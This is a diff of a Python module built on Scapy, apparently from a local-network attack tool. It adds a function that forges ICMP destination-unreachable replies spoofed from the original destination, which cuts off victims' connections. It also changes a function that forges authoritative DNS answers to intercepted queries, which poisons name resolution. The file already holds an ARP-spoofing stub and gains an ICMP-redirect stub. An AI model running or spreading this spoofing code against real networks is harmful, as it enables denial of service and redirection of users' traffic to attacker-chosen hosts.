@@ -1,11 +1,22 @@
-from scapy.layers import inet, inet6, dns
+from scapy.layers import inet, inet6, dns, l2
 from scapy.packet import Packet
 from scapy.sendrecv import send
 
-ban = False
+arp_ban = False
 
 
-def arp_spoof(p: Packet):
+def icmp_unreachable(p: Packet):
+    if p.haslayer(inet.ICMP) and p[inet.ICMP].type == 3:
+        return
+    if p[l2.Ether].type == 2048:
+        exp = inet.IP(src=p[inet.IP].dst, dst=p[inet.IP].src) / inet.ICMP(type=3) / p[inet.IP]
+    else:
+        return
+        # exp = inet6.IPv6(src=p[inet6.IPv6].dst, dst=p[inet6.IPv6].src) / inet.ICMP(type=3)
+    send(exp, verbose=False)
+
+
+def icmp_redirect(p: Packet):
     pass
 
 
@@ -45,7 +56,7 @@ def dns_poison(p: Packet):
     if not p.haslayer(dns.DNS) or p.haslayer(dns.DNSRR) or not p.haslayer(inet.UDP):
         return
 
-    if p.haslayer(inet.IP):
+    if p[l2.Ether].type == 2048:
         exp = inet.IP(dst=p[inet.IP].src, src=p[inet.IP].dst) / \
               inet.UDP(dport=p[inet.UDP].sport, sport=p[inet.UDP].dport) / \
               dns.DNS(id=p[dns.DNS].id, qd=p[dns.DNS].qd, aa=1, qr=1,
